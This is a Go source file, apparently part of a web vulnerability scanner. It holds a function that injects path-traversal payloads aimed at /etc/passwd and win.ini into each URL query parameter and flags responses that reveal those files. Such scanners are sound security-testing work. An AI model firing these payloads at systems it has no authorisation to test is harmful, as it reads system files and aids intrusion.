package modules

import (
	"context"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
)

func (x *XSSScanner) ScanDirectoryTraversal(ctx context.Context, targetURL string) {
	u, err := url.Parse(targetURL)
	if err != nil {
		log.Printf("Error parsing URL: %v", err)
		return
	}

	payloads := []string{
		"../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../windows/win.ini",
	}

	for key := range u.Query() {
		originalValue := u.Query().Get(key)
		for _, payload := range payloads {
			q := u.Query()
			q.Set(key, payload)
			u.RawQuery = q.Encode()
			req, _ := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
			resp, err := x.client.Do(req)
			if err != nil {
				log.Printf("Error sending request: %v", err)
				continue
			}
			body, _ := ioutil.ReadAll(resp.Body)
			if strings.Contains(string(body), "root:") || strings.Contains(string(body), "[fonts]") {
				log.Printf("Directory traversal found in parameter '%s' with payload '%s'", key, payload)
			}
		}
		q := u.Query()
		q.Set(key, originalValue)
		u.RawQuery = q.Encode()
	}
}
